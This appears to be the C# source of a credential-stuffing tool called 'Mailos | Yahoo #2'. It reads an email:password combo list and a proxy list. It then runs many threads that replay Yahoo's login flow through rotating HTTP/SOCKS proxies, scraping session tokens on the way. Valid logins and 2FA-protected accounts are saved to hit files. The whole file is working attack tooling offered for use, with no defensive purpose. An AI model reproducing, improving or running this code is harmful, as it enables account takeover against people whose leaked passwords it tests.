using JawBrute;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;
using yoboi_legend;

namespace Ebay_Checker
{
    class yahoootest
    {
        [STAThread]
        public static void spotstart()
        {
            Prsc.gmxapi();
            Export.Initialize();
            Console.Title = "Mailos | Yahoo #2";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("          > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            start();
        }
        public static void start()
        {
            Console.Clear();
            ASCII.ASCIII();
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Yahoo #2] | Hits: " + Variables.hit + " | 2FA: " + Variables.free + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckAccount)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckAccount()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }

                                var US = WebUtility.UrlEncode("" + s[0] + "");
                                var PS = WebUtility.UrlEncode("" + s[1] + "");
                                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                                httpRequest.AddHeader("Cache-Control", "max-age=0");
                                httpRequest.AddHeader("Connection", "keep-alive");
                                httpRequest.AddHeader("Referer", "https://www.google.com/");
                                httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                                httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                                httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
                                httpRequest.AddHeader("Sec-Fetch-User", "?1");
                                httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");

                                var res0 = httpRequest.Get("https://login.yahoo.com/");
                                string text0 = res0.ToString();

                                var acrumb = Functions.LR(text0, "\"acrumb\" value=\"", "\"").FirstOrDefault();
                                var sessionIndex = Functions.LR(text0, "sessionIndex\" value=\"", "\"").FirstOrDefault();
                                httpRequest.AddHeader("Accept", "*/*");
                                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                                httpRequest.AddHeader("bucket", "mbr-phoenix-gpst");
                                httpRequest.AddHeader("Connection", "keep-alive");
                                httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                                httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
                                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");

                                var res1 = httpRequest.Post("https://login.yahoo.com/", "acrumb=" + acrumb + "&sessionIndex=" + sessionIndex + "&username=" + US + "&passwd=&signin=Next", "application/x-www-form-urlencoded; charset=UTF-8");
                                string text1 = res1.ToString();

                                if (text1.Contains("{\"error\":false"))
                                {
                                    var URL = Functions.JSON(text1, "location").FirstOrDefault();
                                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                    httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                                    httpRequest.AddHeader("Cache-Control", "max-age=0");
                                    httpRequest.AddHeader("Connection", "keep-alive");
                                    httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                                    httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
                                    httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                                    httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                                    httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                                    httpRequest.AddHeader("Sec-Fetch-User", "?1");
                                    httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");

                                    var res2 = httpRequest.Post("" + URL + "", "crumb=czI9ivjtMSr&acrumb=" + acrumb + "&sessionIndex=QQ--&displayName=" + US + "&passwordContext=normal&password=" + PS + "&verifyPassword=Next", "application/x-www-form-urlencoded");
                                    string text2 = res2.ToString();

                                    if (text2.Contains("Manage Accounts") || text2.Contains("Sign Out"))
                                    {
                                        Variables.hit++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [Hit] " + s[0] + ":" + s[1], Color.Green);
                                        Export.AsResult("/hit", s[0] + ":" + s[1]);
                                    }
                                    else if (text2.Contains("Invalid password. Please try again"))
                                    {
                                        Variables.bad++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        break;
                                    }
                                    else if (text2.Contains("For your safety, choose a method below to verify that"))
                                    {
                                        Variables.free++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [2FA] " + s[0] + ":" + s[1], Color.Green);
                                        Export.AsResult("/yahoo-2fa", s[0] + ":" + s[1]);
                                    }


                                }
                                else if (text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME"))
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    break;
                                }


                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;

                    }





                    {
                        goto stat;
                    }
                }
            }
        }

                }

            }




